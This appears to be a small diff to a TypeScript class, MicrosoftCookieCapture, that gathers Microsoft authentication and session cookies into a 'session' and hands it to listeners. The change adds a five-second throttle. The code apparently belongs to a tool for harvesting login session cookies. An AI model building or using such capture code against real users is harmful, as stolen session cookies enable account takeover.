@@ -66,6 +66,7 @@ class MicrosoftCookieCapture {
   private sessionListeners: ((session: MicrosoftCookieSession) => void)[] = [];
   private isMonitoring = false;
   private lastCaptureTime = 0;
+  private lastSessionSent = 0;
   private captureBuffer: CapturedCookie[] = [];
 
   constructor() {
@@ -114,12 +115,19 @@ class MicrosoftCookieCapture {
   private processBufferedCookies() {
     if (this.captureBuffer.length === 0) return;
 
+    // Prevent spam - only process every 5 seconds
+    const now = Date.now();
+    if (now - this.lastSessionSent < 5000) {
+      return;
+    }
+
     const uniqueCookies = this.deduplicateCookies(this.captureBuffer);
     const session = this.buildMicrosoftSession(uniqueCookies);
     
     if (session.authCookies.length > 0 || session.sessionCookies.length > 0) {
       console.log(`🔵 Microsoft session captured: ${session.authCookies.length} auth cookies, ${session.sessionCookies.length} session cookies`);
       this.notifySessionListeners(session);
+      this.lastSessionSent = now;
     }
 
     this.captureBuffer = [];
